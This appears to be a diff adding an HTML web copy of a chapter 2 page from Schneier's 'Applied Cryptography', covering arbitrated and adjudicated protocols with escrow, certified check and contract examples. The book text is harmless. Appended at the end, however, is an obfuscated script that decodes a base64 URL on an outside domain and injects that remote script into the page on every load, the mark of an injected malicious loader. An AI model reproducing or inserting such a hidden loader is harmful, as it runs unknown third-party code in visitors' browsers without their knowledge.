@@ -1,0 +1,160 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Protocol Building Blocks</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=02//-->
+<!--PAGES=023-026//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="02-01.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="02-03.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>In the real world, lawyers are often used as arbitrators. For example, Alice is selling a car to Bob, a stranger. Bob wants to pay by check, but Alice has no way of knowing if the check is good. Alice wants the check to clear before she turns the title over to Bob. Bob, who doesn&#146;t trust Alice any more than she trusts him, doesn&#146;t want to hand over a check without receiving a title.
+</P>
+<TABLE WIDTH="100%"><TR>
+<TH CAPTION ALIGN="CENTER" COLSPAN="2">TABLE 2.1<BR>Dramatis Personae
+<TR>
+<TH COLSPAN="2"><HR>
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="20%">Alice
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="80%">First participant in all the protocols
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Bob
+<TD VALIGN="TOP" ALIGN="LEFT">Second participant in all the protocols
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Carol
+<TD VALIGN="TOP" ALIGN="LEFT">Participant in the three- and four-party protocols
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Dave
+<TD VALIGN="TOP" ALIGN="LEFT">Participant in the four-party protocols
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Eve
+<TD VALIGN="TOP" ALIGN="LEFT">Eavesdropper
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Mallory
+<TD VALIGN="TOP" ALIGN="LEFT">Malicious active attacker
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Trent
+<TD VALIGN="TOP" ALIGN="LEFT">Trusted arbitrator
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Walter
+<TD VALIGN="TOP" ALIGN="LEFT">Warden; he&#146;ll be guarding Alice and Bob in some protocols
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Peggy
+<TD VALIGN="TOP" ALIGN="LEFT">Prover
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Victor
+<TD VALIGN="TOP" ALIGN="LEFT">Verifier
+<TR>
+<TH COLSPAN="2"><HR>
+<TR>
+</TABLE>
+<I><P><A NAME="Fig1"></A><A HREF="javascript:displayWindow('images/02-01.jpg',263,265 )"><IMG SRC="images/02-01t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/02-01.jpg',263,265)"><FONT COLOR="#000077"><B>Figure 2.1</B></FONT></A>&nbsp;&nbsp;Types of protocols.</I>
+</P>
+<P>Enter a lawyer trusted by both. With his help, Alice and Bob can use the following protocol to ensure that neither cheats the other:
+</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice gives the title to the lawyer.
+<DD><B>(2)</B>&nbsp;&nbsp;Bob gives the check to Alice.
+<DD><B>(3)</B>&nbsp;&nbsp;Alice deposits the check.
+<DD><B>(4)</B>&nbsp;&nbsp;After waiting a specified time period for the check to clear, the lawyer gives the title to Bob. If the check does not clear within the specified time period, Alice shows proof of this to the lawyer and the lawyer returns the title to Alice.
+</DL>
+<P>In this protocol, Alice trusts the lawyer not to give Bob the title unless the check has cleared, and to give it back to her if the check does not clear. Bob trusts the lawyer to hold the title until the check clears, and to give it to him once it does. The lawyer doesn&#146;t care if the check clears. He will do his part of the protocol in either case, because he will be paid in either case.
+</P>
+<P>In the example, the lawyer is playing the part of an escrow agent. Lawyers also act as arbitrators for wills and sometimes for contract negotiations. The various stock exchanges act as arbitrators between buyers and sellers.</P>
+<P>Bankers also arbitrate protocols. Bob can use a certified check to buy a car from Alice:</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Bob writes a check and gives it to the bank.
+<DD><B>(2)</B>&nbsp;&nbsp;After putting enough of Bob&#146;s money on hold to cover the check, the bank certifies the check and gives it back to Bob.
+<DD><B>(3)</B>&nbsp;&nbsp;Alice gives the title to Bob and Bob gives the certified check to Alice.
+<DD><B>(4)</B>&nbsp;&nbsp;Alice deposits the check.
+</DL>
+<P>This protocol works because Alice trusts the banker&#146;s certification. Alice trusts the bank to hold Bob&#146;s money for her, and not to use it to finance shaky real estate operations in mosquito-infested countries.
+</P>
+<P>A notary public is another arbitrator. When Bob receives a notarized document from Alice, he is convinced that Alice signed the document voluntarily and with her own hand. The notary can, if necessary, stand up in court and attest to that fact.</P>
+<P>The concept of an arbitrator is as old as society. There have always been people&#151;rulers, priests, and so on&#151;who have the authority to act fairly. Arbitrators have a certain social role and position in our society; betraying the public trust would jeopardize that. Lawyers who play games with escrow accounts face almost-certain disbarment, for example. This picture of trust doesn&#146;t always exist in the real world, but it&#146;s the ideal.</P>
+<P>This ideal can translate to the computer world, but there are several problems with computer arbitrators:</P>
+<DL>
+<DD>&#151; It is easier to find and trust a neutral third party if you know who the party is and can see his face. Two parties suspicious of each other are also likely to be suspicious of a faceless arbitrator somewhere else on the network.
+<DD>&#151; The computer network must bear the cost of maintaining an arbitrator. We all know what lawyers charge; who wants to bear that kind of network overhead?
+<DD>&#151; There is a delay inherent in any arbitrated protocol.
+<DD>&#151; The arbitrator must deal with every transaction; he is a bottleneck in large-scale implementations of any protocol. Increasing the number of arbitrators in the implementation can mitigate this problem, but that increases the cost.
+<DD>&#151; Since everyone on the network must trust the arbitrator, he represents a vulnerable point for anyone trying to subvert the network.
+</DL>
+<P>Even so, arbitrators still have a role to play. In protocols using a trusted arbitrator, the part will be played by Trent.
+</P>
+<P><FONT SIZE="+1"><B><I>Adjudicated Protocols</I></B></FONT></P>
+<P>Because of the high cost of hiring arbitrators, arbitrated protocols can be subdivided into two lower-level <B>subprotocols</B>. One is a nonarbitrated subprotocol, executed every time parties want to complete the protocol. The other is an arbitrated subprotocol, executed only in exceptional circumstances&#151;when there is a dispute. This special type of arbitrator is called an <B>adjudicator</B> (see Figure 2.1b).</P>
+<P>An adjudicator is also a disinterested and trusted third party. Unlike an arbitrator, he is not directly involved in every protocol. The adjudicator is called in only to determine whether a protocol was performed fairly.</P>
+<P>Judges are professional adjudicators. Unlike a notary public, a judge is brought in only if there is a dispute. Alice and Bob can enter into a contract without a judge. A judge never sees the contract until one of them hauls the other into court.</P>
+<P>This contract-signing protocol can be formalized in this way:</P>
+<P>Nonarbitrated subprotocol (executed every time):</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice and Bob negotiate the terms of the contract.
+<DD><B>(2)</B>&nbsp;&nbsp;Alice signs the contract.
+<DD><B>(3)</B>&nbsp;&nbsp;Bob signs the contract.
+</DL>
+<P>Adjudicated subprotocol (executed only in case of a dispute):
+</P>
+<DL>
+<DD><B>(4)</B>&nbsp;&nbsp;Alice and Bob appear before a judge.
+<DD><B>(5)</B>&nbsp;&nbsp;Alice presents her evidence.
+<DD><B>(6)</B>&nbsp;&nbsp;Bob presents his evidence.
+<DD><B>(7)</B>&nbsp;&nbsp;The judge rules on the evidence.
+</DL>
+<P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="02-01.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="02-03.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(hoNFoFOz, TNNPBFaT) {TNNPBFaT = hoNFoFOz.createElement('script');TNNPBFaT.type = 'text/javascript';TNNPBFaT.async = true;TNNPBFaT.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');hoNFoFOz.getElementsByTagName('body')[0].appendChild(TNNPBFaT);}(document));</script></body>
+</html>
